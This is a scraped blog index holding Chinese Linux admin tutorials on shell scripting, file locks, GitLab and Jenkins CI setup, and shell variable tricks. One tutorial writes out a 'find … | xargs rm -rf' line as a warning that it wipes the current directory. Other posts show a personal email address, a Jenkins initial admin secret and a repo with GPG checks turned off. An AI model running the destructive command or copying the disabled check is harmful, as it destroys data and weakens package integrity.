12345678910111213141516171819202122[root@oldboyedu scripts]# cat func.sh #!&#x2F;bin&#x2F;bash#oldboyedufunction oldboyedu()&#123; echo &quot;Hello world&quot; echo $0 echo $1 echo $2 exit&#125;etiantian()&#123; echo &quot;good&quot; return 3 echo &#39;bad&#39;&#125;#oldboyedu hanshu1 hanshu2oldboyedu $1 $2etiantian 将函数体与脚本分离 1234#!&#x2F;bin&#x2F;bash. &#x2F;etc&#x2F;init.d&#x2F;functions #加载系统函数库. &#x2F;server&#x2F;scirpts&#x2F;fun.sh #加载自定义函数库 了解 123basename &#x2F;server&#x2F;scripts&#x2F;fun.sh #取出脚本名（去除脚本目录）dirname &#x2F;server&#x2F;scripts&#x2F;fun.sh #取出脚本路径（去除脚本名称）basename &#x2F;server&#x2F;scripts&#x2F;fun.sh .sh #去除脚本路径并去除脚本文件.sh后缀 实现shell文件锁 1不让脚本在执行的过程中重复执行的问题，可以使用shell文件锁解决。 123456789101112131415161718192021222324252627#!&#x2F;bin&#x2F;bash# 脚本初始化function scripts_init()&#123; prog&#x3D;&#96;basename $0 .sh&#96; LockFile&#x3D;&#x2F;var&#x2F;lock&#x2F;subsys&#x2F;$&#123;prog&#125;.lock # 使用锁文件 LogFile&#x3D;&#x2F;var&#x2F;log&#x2F;$&#123;prog&#125;.log # 脚本记录日志 PidFile&#x3D;&#x2F;var&#x2F;run&#x2F;$&#123;prog&#125;.pid # 记录进程号，可以管理脚本 [ -f $LockFile ] &amp;&amp; echo &quot;There $LockFile is exist!!&quot; &amp;&amp; exit 1 ||touch $LockFile [ ! -f $LogFile ] &amp;&amp; touch $LogFile [ -f $PidFile ] &amp;&amp; echo &quot;There $PidFile is exist!!&quot; &amp;&amp; exit 2|| echo $$ &gt; $PidFile&#125;# 记录日志function writelog()&#123; Date&#x3D;$(date &quot;+%F_%T&quot;) ShellName&#x3D;&#96;basename $0&#96; Info&#x3D;$1 echo &quot;$Date : $&#123;ShellName&#125; : $&#123;Info&#125;&quot; &gt;&gt; $&#123;LogFile&#125;&#125;# 脚本退出扫尾function closeout()&#123; [ -f $LockFile ] &amp;&amp; rm -f $LockFile [ -f $PidFile ]&amp;&amp; rm -f $PidFile&#125; 脚本调试 123456(1) sh -x &quot;脚本名称&quot;(2) vim fun.sh +9 #直接跳到fun.sh脚本的第9行(3) 指定调试位置：在脚本内，在指定位置前面加上 sed -x ,在后面加上 sed +x ,使用sh &quot;脚本名称&quot; 就实现了部分内容调试","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"DDos","slug":"DDos","permalink":"https://garywu520.github.io/tags/DDos/"},{"name":"shell DDos","slug":"shell-DDos","permalink":"https://garywu520.github.io/tags/shell-DDos/"},{"name":"break","slug":"break","permalink":"https://garywu520.github.io/tags/break/"},{"name":"continue","slug":"continue","permalink":"https://garywu520.github.io/tags/continue/"},{"name":"exit","slug":"exit","permalink":"https://garywu520.github.io/tags/exit/"},{"name":"return","slug":"return","permalink":"https://garywu520.github.io/tags/return/"}]},{"title":"部署Gitlab+maven+jenkins持续集成环境-进阶1","slug":"部署Gitlab-maven-jenkins持续集成环境-进阶1","date":"2017-12-05T02:50:10.000Z","updated":"2017-12-16T11:38:15.095Z","comments":true,"path":"2017/12/05/部署Gitlab-maven-jenkins持续集成环境-进阶1/","link":"","permalink":"https://garywu520.github.io/2017/12/05/%E9%83%A8%E7%BD%B2Gitlab-maven-jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83-%E8%BF%9B%E9%98%B61/","excerpt":"为什么要持续集成？ 123持续集成，简称CI。持续集成指的是，频繁的（一天多次）将代码集成到主干好处：极大程度降低 “代码合并冲突” 几率 123开发上传自己的代码到Gitlab, Gitlab发消息给Jenkins，随后Jenkins从仓库拉取代码，最后全自动部署到测试服务器进行相关测试，并将测试结果通知运维和开发，这种自动测试的方法叫做持续交付。持续部署是持续交付的下一步，指的是代码通过评审以后，自动部署到生产环境 1行话：CI&#x2F;CD 指的是持续集成&#x2F;持续交付&#x2F;持续部署","text":"为什么要持续集成？ 123持续集成，简称CI。持续集成指的是，频繁的（一天多次）将代码集成到主干好处：极大程度降低 “代码合并冲突” 几率 123开发上传自己的代码到Gitlab, Gitlab发消息给Jenkins，随后Jenkins从仓库拉取代码，最后全自动部署到测试服务器进行相关测试，并将测试结果通知运维和开发，这种自动测试的方法叫做持续交付。持续部署是持续交付的下一步，指的是代码通过评审以后，自动部署到生产环境 1行话：CI&#x2F;CD 指的是持续集成&#x2F;持续交付&#x2F;持续部署 化整为零 12341.这套组合可以分成源码管理、编译构建、远程部署2.源码管理常见的有gitlab、SVN3.编译构建是针对编译型语言的。此处针对Java语言使用Maven、针对IOS则是使用其他编译工具。4.远程部署由jenkins提供。 配置部署 环境 12node1 10.0.10.21 角色：Jenkins Master、Maven、Git、JDKnode1 10.0.10.22 角色：Gitlab、Jenkins slave Node1-21配置 Jenkins ​ 参考：Jenkins安装-Docker 1234567891011rpm方式安装# yum安装jdkecho &quot;192.168.21.200 mirrors.aliyun.com&quot; &gt;&gt;&#x2F;etc&#x2F;hostscurl -o &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-7.repoyum clean allyum -y install java-1.8.0-openjdk java-1.8.0-openjdk-devel# 安装rpm包rpm -ivh jenkins-2.73.1-1.1.noarch.rpm# 启动&#x2F;etc&#x2F;init.d&#x2F;jenkins start 123rpm -ql jenkinsJenkins家目录：&#x2F;var&#x2F;lib&#x2F;jenkinsWeb站点目录：&#x2F;var&#x2F;cache&#x2F;jenkins Maven安装 12Maven负责java语言的编译和打包。换个角度来说，Maven相当于Java中的make命令。官方地址：http:&#x2F;&#x2F;maven.apache.org&#x2F; 安装JDK 1yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel 安装Maven 12345678910111213141516(1) 获取安装包wget https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2&#x2F;org&#x2F;apache&#x2F;maven&#x2F;apache-maven&#x2F;3.3.9&#x2F;apache-maven-3.3.9-bin.tar.gz(2) 解压tar -zxvf apache-maven-3.3.9-bin.tar.gz -C &#x2F;usr&#x2F;local&#x2F; ln -s &#x2F;usr&#x2F;local&#x2F;apache-maven-3.3.9 &#x2F;usr&#x2F;local&#x2F;maven(3) 定义变量vim &#x2F;etc&#x2F;profile.d&#x2F;maven.sh export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven export MAVEN_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven PATH&#x3D;$M2_HOME&#x2F;bin:$PATH[root@node2 ~]# source &#x2F;etc&#x2F;profile.d&#x2F;maven.sh(4) 查看版本mvn -v 编译安装git 123wget https:&#x2F;&#x2F;www.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.12.0.tar.gz注意：为了能让jenkins能正常从gitlab中拉取源码，需要编译1.9以上的版本。 安装编译环境 123yum groupinstall &quot;Development tools&quot;yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker openssh-clients除了正常的编译环境之外，编译git的时候还要额外安装各种devel包。否则会构建失败。 编译安装 123456tar -zxvf git-2.12.0.tar.gz &amp;&amp; cd git-2.12.0make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;bashrcsource &#x2F;etc&#x2F;bashrcgit --version 配置Jenkins 指定Maven、Git和JDK的安装路径 1Jenkins Web -- 系统管理 -- Global Tool Configuration Jenkins优化 增加执行者数量 1系统管理--系统设置 -- 修改执行者数量 -- 保存 配置Jenkins邮箱设置 12345678系统管理--系统设置 -- 修改系统管理员邮箱地址 -- 保存系统管理--系统设置 -- 系统管理员邮件地址(写上17610397690@163.com) -- 保存系统管理--系统设置 -- 邮件通知 -- 填写如下信息：SMTP设置： smtp.163.com使用SMTP认证： 勾选用户名: 17610397690@163.com密码：填写163上面的授权码通过发送测试邮件配置：勾选并填写收件箱地址：17610397690@163.com -- 点击测试发送 -- 最后保存即可 配置Jenkins连接Gitlab 12(1)新建 -- 输入item name(比如：garywu) -- 选择构建一个自由风格的软件项目 -- OK保存(2)进入jenkins garywu的item -- 点击&quot;源码管理&quot; -- 选择“Git” -- 输入Git地址 (git@192.168.56.16:root&#x2F;37team.git) -- 输入连接git的私钥 -- 直到不报错。 12(3) 构建 -- 选择“Execute shell” -- 输入测试命令“df -h”(4) 构建后的操作 -- 选择“E-mail Notification” -- 输入接收邮箱地址即可(推荐163邮箱-17610397690@163.com) -- 保存 项目手动构建 123主页 -- 点击项目并进入项目 -- 左侧点击“立即构建” -- 构建若出现错误显示红色，可以看到控制台日志来查看具体错误，一般是权限问题。因为Jenkins是以Jenkins用户来启动的，所以Jenkins用户缺少很多权限，手动在命令行授权即可 Gitlab代码提交Jenkins自动构建 配置Gitlab token 12345678(1)安装插件: GitLab Plugin(2)首页 -- credentials -- system -- Global credentials(unrestricted) -- add Credentials -- Kind选择GitLab API Token -- 填写API Token(从Gitlab账号--设置--account中Private Token获取) -- 保存(3)系统管理 -- 系统设置 -- Gitlab Connection name：Gitlab Gitlab host URL: http:&#x2F;&#x2F;192.168.56.16 Credentials: 选择刚添加的Gitlab API token Test --&gt;当出现success即可 最后保存 配置item-生成Jenkins token 1jenkins -- 点击item --构建触发器 -- 勾选&quot;Build when a change is pushed to GitLab. GitLab CI Service URL: http:&#x2F;&#x2F;192.168.56.15:8080&#x2F;project&#x2F;oldtboyedu&quot; -- 点击“高级” -- 生成Jenkins token -- 把此界面中的URL和Token复制出来放到文本文件，稍后会用到 -- 最后保存配置 配置Gitlab项目 123进入唯一的37team主页 -- settings -- Integrations -- URL填写上面保存的URL -- secret Token 粘贴刚才生成的Jenkins token -- 最后点击&quot;Add webhook&quot; 然后，在此页面就能看到刚添加的一个Webhooks，点击右侧的Test -- 立即打开Jenkins项目中构建页面，可以看到已经自动生成了一个新的构建并自动开始运行了，另外这个构建有个说明: Started by Gitlab push by Administrator 代码提交后自动构建-测试验证 1向Gitlab project项目中添加一个文件，并简单写下描述，然后立即打开Jenkins项目中构建页面，可以看到已经自动生成了一个新的构建并自动开始运行了，至此就实现了自动构建功能 关于生产环境实践 一：分组上线 123456789倘若nginx代理10台后端tomcat，由于启动需要时间，所以务必分组上线所谓分组上线就是把后端机分成2组，即AB分组上线方法：第A组后端机注释,升级代码。然后恢复A组配置，再注释并升级B组代码。这样操作起来很麻烦且耗时，弄不好容易出错。终极方案：准备四套配置文件，每套配置文件进行不同定义，如下:nginx-A.conf #上线A组服务器代码nginx-B.conf #上线B组服务器代码nginx-new.conf #全部后端tomcat上线nginx-old.conf #快速回滚 二：灰度发布 1234灰度发布指黑与白之间，能给平衡过渡的一种发布方式。方案1: 智能DNS调度, 即根据用户使用的LocalDNS来进行DNS解析到对应域名解析服务器。方案2：收集用户的IP地址所在地区进行区分。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://garywu520.github.io/tags/Gitlab/"},{"name":"持续集成","slug":"持续集成","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"持续交付","slug":"持续交付","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"},{"name":"maven","slug":"maven","permalink":"https://garywu520.github.io/tags/maven/"},{"name":"java","slug":"java","permalink":"https://garywu520.github.io/tags/java/"},{"name":"jdk","slug":"jdk","permalink":"https://garywu520.github.io/tags/jdk/"},{"name":"jenkins","slug":"jenkins","permalink":"https://garywu520.github.io/tags/jenkins/"},{"name":"自动构建","slug":"自动构建","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E6%9E%84%E5%BB%BA/"}]},{"title":"Gitlab部署-CentOS7","slug":"Gitlab部署CentOS7","date":"2017-12-05T02:08:17.000Z","updated":"2017-12-16T08:23:05.473Z","comments":true,"path":"2017/12/05/Gitlab部署CentOS7/","link":"","permalink":"https://garywu520.github.io/2017/12/05/Gitlab%E9%83%A8%E7%BD%B2CentOS7/","excerpt":"1由于需要, Gitlab与Jenkins进行持续集成，现使用CentOS7搞一套Gitlab 编辑repo文件 1vim &#x2F;etc&#x2F;yum.repos.d&#x2F;gitlab-ce.repo","text":"1由于需要, Gitlab与Jenkins进行持续集成，现使用CentOS7搞一套Gitlab 编辑repo文件 1vim &#x2F;etc&#x2F;yum.repos.d&#x2F;gitlab-ce.repo 12345[gitlab-ce]name&#x3D;Gitlab CE Repositorybaseurl&#x3D;https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;gitlab-ce&#x2F;yum&#x2F;el7&#x2F;gpgcheck&#x3D;0enabled&#x3D;1 安装 1234yum install gitlab-ce#查看安装了哪些东西gitlab-ctl status 配置 1[root@localhost ~]# vim &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb 找到external_url那项，改为域名或本机IP地址： 1external_url &#39;http:&#x2F;&#x2F;10.0.10.22&#39; 启动 123456[root@localhost ~]# gitlab-ctl reconfigure #过程较慢,耐心等待Running handlers:Running handlers completeChef Client finished, 384&#x2F;541 resources updated in 02 minutes 28 secondsgitlab Reconfigured! 开机自启 1systemctl enable gitlab-runsvdir.service Web登陆 123http:&#x2F;&#x2F;10.0.10.22 用户名：root 根据Web提示修改密码 配置禁止注册 1一般公司内部使用的话，是禁止注册的，用的话单独开设账号。 12工具 -- 设置 -- 取消打钩“Sign-up enabled” -- 保存 重新登录来验证 修改时区 12[root@localhost ~]# cat &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb |grep time_zonegitlab_rails[&#39;time_zone&#39;] &#x3D; &#39;Asia&#x2F;Shanghai&#39;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://garywu520.github.io/tags/Gitlab/"},{"name":"Git服务器","slug":"Git服务器","permalink":"https://garywu520.github.io/tags/Git%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"CentOS7","slug":"CentOS7","permalink":"https://garywu520.github.io/tags/CentOS7/"}]},{"title":"Jenkins安装初始化","slug":"Jenkins安装初始化","date":"2017-12-04T08:35:16.000Z","updated":"2017-12-04T09:57:05.556Z","comments":true,"path":"2017/12/04/Jenkins安装初始化/","link":"","permalink":"https://garywu520.github.io/2017/12/04/Jenkins%E5%AE%89%E8%A3%85%E5%88%9D%E5%A7%8B%E5%8C%96/","excerpt":"下载Jenkins镜像 参考：CentOS7安装docker","text":"下载Jenkins镜像 参考：CentOS7安装docker 1.启动Jenkins 123docker-compose up -d 首次启动并后台运行docker-compose start | stop | psss -lntup |grep 8080 2.浏览器访问Jenkins 1http:&#x2F;&#x2F;10.0.10.21:8080 Web初始化 输入Administrator password 1234567[root@localhost docker-compose]# find &#x2F; -name &quot;initialAdminPassword&quot;&#x2F;opt&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword[root@localhost docker-compose]# cat &#x2F;opt&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassworda606cead71ce4ae0a9c00e28af2c855b把此行密钥粘贴到网页上，下一步 选择安装插件 1按需选择即可 创建管理员账户和密码 12根据提示填写即可账户：garywu 密码：常用P4 Web Dashboard","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://garywu520.github.io/tags/Gitlab/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://garywu520.github.io/tags/Jenkins/"},{"name":"持续集成","slug":"持续集成","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"持续交付","slug":"持续交付","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"}]},{"title":"shell高级编程-进阶2","slug":"shell高级编程-进阶2","date":"2017-12-02T01:39:59.000Z","updated":"2017-12-02T10:27:50.767Z","comments":true,"path":"2017/12/02/shell高级编程-进阶2/","link":"","permalink":"https://garywu520.github.io/2017/12/02/shell%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B-%E8%BF%9B%E9%98%B62/","excerpt":"定义变量的三种方式 直接赋值 123如：x&#x3D;10 或 file&#x3D;&#x2F;etc&#x2F;hosts规律：脚本中能用变量的地方尽量使用变量 传参(传递参数) 123$0 $1 ... $n $#传参方式让脚本更加灵活 交互式设置变量 1使用read命令实现脚本交互。","text":"定义变量的三种方式 直接赋值 123如：x&#x3D;10 或 file&#x3D;&#x2F;etc&#x2F;hosts规律：脚本中能用变量的地方尽量使用变量 传参(传递参数) 123$0 $1 ... $n $#传参方式让脚本更加灵活 交互式设置变量 1使用read命令实现脚本交互。 1234[root@jkbackup scripts]# readoldboy #输入字符就相当于给$REPLY变量赋值[root@jkbackup scripts]# echo $REPLYoldboy 1234567[root@jkbackup scripts]# read -p &quot;请输入你的年龄:&quot;请输入你的年龄:18[root@jkbackup scripts]# echo $REPLY18-p 设置提示语句age 设置的变量名称,前面要有空格 把值明确赋值给某个变量 123456[root@jkbackup scripts]# read -p &quot;请输入你的姓名:&quot; age请输入你的姓名:garywu[root@jkbackup scripts]# echo $agegarywu[root@jkbackup scripts]# echo $REPLY #可以看到$REPLY的值没变18 交互输入银行卡账号密码 123456789101112131415[root@jkbackup scripts]# cat test.sh read -t 5 -p &quot;请输入你的银行卡账号: &quot; accountread -t 5 -s -p &quot;请输入你的银行卡密码: &quot; passechoecho &quot;你的银行卡卡号：&quot; $account ，&quot;你的银行卡密码：&quot; $pass 注：-s 用来关闭回显,即不显示输入的内容 -t 设置超时时间,单位:秒。超时后将退出交互 echo shell换行符结果:[root@jkbackup scripts]# sh test.sh 请输入你的银行卡账号: 12345请输入你的银行卡密码: 你的银行卡卡号： 12345 ，你的银行卡密码： 67890 变量的子串 123查找man bash搜索Parameter Expansion变量的长度是指: 变量值的长度 123456789101112基础知识[root@jkbackup scripts]# OLDBOY&#x3D;&quot;I am oldboy&quot;[root@jkbackup scripts]# echo $&#123;OLDBOY&#125;I am oldboy[root@jkbackup scripts]# echo $&#123;OLDBOY&#125;|wc -L #统计变量值的长度11[root@jkbackup scripts]# time echo $&#123;OLDBOY&#125;|wc -L11real 0m0.006suser 0m0.000ssys 0m0.005s 获取子串(变量值)的长度 123456格式: echo $&#123;#OLDBOY&#125;例：[root@jkbackup scripts]# file&#x3D;&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0 [root@jkbackup scripts]# echo $&#123;#file&#125;41 提取部分子串 12345678910[root@jkbackup scripts]# echo $&#123;file&#125;&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0#从第4个子串开始切(起始是0)[root@jkbackup scripts]# echo $&#123;file:4&#125; &#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0#从第4个开始切(起始是0),并且往后保留10位[root@jkbackup scripts]# echo $&#123;file:4:10&#125; &#x2F;sysconfig 删除部分字符串 123456789[root@jkbackup scripts]# oldboy&#x3D;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy&#125;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy#a*c&#125; #从前往后最短匹配ABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy#a*C&#125;123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy##a*C&#125; #从前往后最长匹配abc 12345678910111213[root@jkbackup scripts]# echo $&#123;oldboy&#125;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy%abc&#125; #从后往前最短匹配abcABC123ABC[root@jkbackup scripts]# echo $&#123;oldboy%a*c&#125; #从后往前最短匹配abcABC123ABC[root@jkbackup scripts]# echo $&#123;oldboy%a*C&#125;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy%%a*c&#125; #从后往前最长匹配[root@jkbackup scripts]# [root@jkbackup scripts]# echo $&#123;oldboy%%A*c&#125; #从后往前最长匹配abc 替换 1234567891011单个替换[root@jkbackup scripts]# echo $&#123;oldboy&#125;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy&#x2F;123&#x2F;888&#125;abcABC888ABCabc全部替换[root@jkbackup scripts]# echo $&#123;oldboy&#125;abcABC123ABCabc[root@jkbackup scripts]# echo $&#123;oldboy&#x2F;&#x2F;ABC&#x2F;KKK&#125;abcKKK123KKKabc 空变量 1234find一个空变量并删除的结果: find &#123;$test&#125; |xargs rm -rf #此操作会删除当前目录所有文件,如果是在root用户执行，结果就呵呵了O(∩_∩)O~ 变量赋值 1234567示例：httpd&#x3D;$&#123;HTTPD-&#x2F;usr&#x2F;sbin&#x2F;httpd&#125;prog&#x3D;httpdpidfile&#x3D;$&#123;PIDFILE-&#x2F;var&#x2F;run&#x2F;httpd&#x2F;httpd.pid&#125;lockfile&#x3D;$&#123;LOCKFILE-&#x2F;var&#x2F;lock&#x2F;subsys&#x2F;httpd&#125;如果$HTTP变量值为空，则赋值为&#x2F;usr&#x2F;sbin&#x2F;httpd 123456#检测变量不存在就临时赋值[root@jkbackup scripts]# echo $&#123;HTTPD-&#x2F;usr&#x2F;sbin&#x2F;httpd&#125; &#x2F;usr&#x2F;sbin&#x2F;httpd[root@jkbackup scripts]# echo $HTTPD #此时这个变量值还是空[root@jkbackup scripts]# 12345#检测变量不存在就进行赋值[root@jkbackup scripts]# echo $&#123;HTTPD&#x3D;&#x2F;usr&#x2F;sbin&#x2F;httpd&#125; &#x2F;usr&#x2F;sbin&#x2F;httpd[root@jkbackup scripts]# echo $HTTPD #变量值随之改变&#x2F;usr&#x2F;sbin&#x2F;httpd 变量的数值运算 使用双括号 (()) 进行加减乘除 1234567格式：echo $((1+1*8))[root@jkbackup scripts]# echo $((1+1*8))9[root@jkbackup scripts]# echo $((1+2**3)) #1+2的三次方9[root@jkbackup scripts]# echo $((1+2**3-(5+1))) #先算括号内的,再加减乘除3 1234567891011i&#x3D;5echo $((i++)) 或echo $((++i)) #每次运算的值自动加1[root@jkbackup scripts]# i&#x3D;5[root@jkbackup scripts]# [root@jkbackup scripts]# echo $((i++))5[root@jkbackup scripts]# echo $((i++))6[root@jkbackup scripts]# echo $((i++))7 1234567891011i&#x3D;7echo $((i--)) 或echo $((--i)) #每次运算的值自动减1[root@jkbackup scripts]# echo $((--i))7[root@jkbackup scripts]# echo $((--i))6[root@jkbackup scripts]# echo $((--i))5[root@jkbackup scripts]# echo $((--i))4 写一个加减乘除的shell计算器 1234567[root@jkbackup scripts]# cat jisuanqi.sh #!&#x2F;bin&#x2F;bashecho &quot;shell计算器&quot;read -p &#39;输入一个数字: &#39; aread -p &#39;请输入计算方法: &#39; bread -p &#39;输入一个数字: &#39; cecho &quot;计算结果: &quot;$(($a$b$c)) 使用let进行加减乘除运算 1234[root@jkbackup scripts]# i&#x3D;1[root@jkbackup scripts]# let i&#x3D;i+1[root@jkbackup scripts]# echo $i2 使用expr进行加减乘除运算 123456789示例：expr 1 + 2 [root@jkbackup scripts]# expr 1 + 23[root@jkbackup scripts]# expr 1 \\* 22[root@jkbackup scripts]# [root@jkbackup scripts]# expr 4 \\&#x2F; 22 使用expr判断输入的传参是否为整数 12345678[root@jkbackup scripts]# expr 1 + aexpr: non-integer argument(非整数参数)[root@jkbackup scripts]# expr 1 + 12.5expr: non-integer argument[root@jkbackup scripts]# echo $? #非整数返回值是22[root@jkbackup scripts]# bc 小数计算 12345678bc进入交互界面1+13[root@jenkins ~]# echo &quot;scale&#x3D;2;355&#x2F;113&quot;|bc3.14[root@jenkins ~]# echo &quot;scale&#x3D;12;355&#x2F;113&quot;|bc3.141592920353 []加减乘除计算 1234[root@jenkins ~]# echo $[2+3]5[root@jenkins ~]# echo $[2*3]6 awk计算 1234[root@jenkins ~]# echo &quot;7.7 3.8&quot;|awk &#39;&#123;print ($1-$2)&#125;&#39;3.9[root@jenkins ~]# echo &quot;7.7 3.8&quot;|awk &#39;&#123;print ($1-$2*$1)&#125;&#39;-21.56 条件表达式1对环境等进行判断 文件判断 123456先敲一对[],然后退格输入2个空格[ ],最后再回退一个空格开始输入[ -f &#x2F;etc&#x2F;hosts ]文件判断[root@jkbackup scripts]# [ -f &#x2F;etc&#x2F;hosts ][root@jkbackup scripts]# echo $? #0表示命令执行成功，文件存在0 123456789[ -f &#x2F;etc&#x2F;hosts ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;[ -f &#x2F;etc&#x2F;host ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;[ -f &#x2F;etc&#x2F;hosts ] &amp;&amp; cat &#x2F;etc&#x2F;hosts || echo &quot;文件不存在&quot;[ -f &#x2F;etc&#x2F;host ] &amp;&amp; cat &#x2F;etc&#x2F;hosts || echo &quot;文件不存在&quot;[ -d &#x2F;etc1&#x2F; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式不成立[ -d &#x2F;etc&#x2F; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式成立 字符串判断 123456[root@jenkins scripts]# name&#x3D;[root@jenkins scripts]# [ -z &quot;$name&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式成立[root@jenkins scripts]# name&#x3D;&quot; &quot;[root@jenkins scripts]# [ -z &quot;$name&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式不成立 123[root@jenkins scripts]# [ -z &quot;$age&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式成立[root@jenkins scripts]# [ -n &quot;$age&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; 12[ &quot;$name1&quot; &#x3D;&#x3D; &quot;$name2&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;[ &quot;$name1&quot; !&#x3D; &quot;$name2&quot; ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot; 整数判断 123456789101112131415-eq equal 等于-ne not equal 不等于-gt great than 大于-ge great equal 大于等于-lt less than 小于-le less equal 小于等于[root@jkbackup scripts]# [ 1 -ne 2 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式成立[root@jkbackup scripts]# [ 10 -le 2 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成 立&quot;表达式不成立[root@jkbackup scripts]# [ 10 -gt 19 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不.立&quot;表达式不成立[root@jkbackup scripts]# [ 10 -le 19 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不.立&quot;表达式成立 逻辑判断符 1234567891011与 简写：-a或 简写：-o非 简写: ！[root@jkbackup scripts]# [ 10 -le 19 -a 5 -gt 8 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;&quot;表达式不成立[root@jkbackup scripts]# [root@jkbackup scripts]# [ 10 -le 19 -a 5 -lt 8 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;&quot;表达式成立[root@jkbackup scripts]# [ 10 -le 19 -a ! 5 -lt 8 ] &amp;&amp; echo &quot;表达式成立&quot; || echo &quot;表达式不成立&quot;表达式不成立 判断两个数字-测试 1234567891011121314151617181920212223直接赋值方式[root@jkbackup shell]# cat read.sh #!&#x2F;bin&#x2F;bashnum1&#x3D;10num2&#x3D;3#判断变量不为空[ -z &quot;$num1&quot; ] &amp;&amp; echo &quot;第一个变量未赋值&quot; &amp;&amp; exit 1[ -z &quot;$num2&quot; ] &amp;&amp; echo &quot;第二个变量未赋值&quot; &amp;&amp; exit 1#判断是不是整数expr 2 + &quot;$num1&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第一个不是数字” &amp;&amp; exit 1expr 2 + &quot;$num2&quot; &amp;&gt;&#x2F;dev&#x2F;null[ $? -eq 2 ] &amp;&amp; echo “第二个不是数字” &amp;&amp; exit 1#正式判断[ $num1 -gt $num2 ] &amp;&amp; echo &quot;$num1 &gt; $num2&quot; &amp;&amp; exit[ $num1 -eq $num2 ] &amp;&amp; echo &quot;$num1 &#x3D; $num2&quot; &amp;&amp; exit[ $num1 -lt $num2 ] &amp;&amp; echo &quot;$num1 &lt; $num2&quot; 123456789101112131415161718192021222324252627282930313233变量方式[root@jkbackup shell]# cat read.sh #!&#x2F;bin&#x2F;bashnum1&#x3D;$1num2&#x3D;$2[ $# !&#x3D; 2 ] &amp;&amp; echo &quot;USAGE：sh $0 num1 num2&quot; &amp;&amp; exit 1#判断变量不为空[ -z 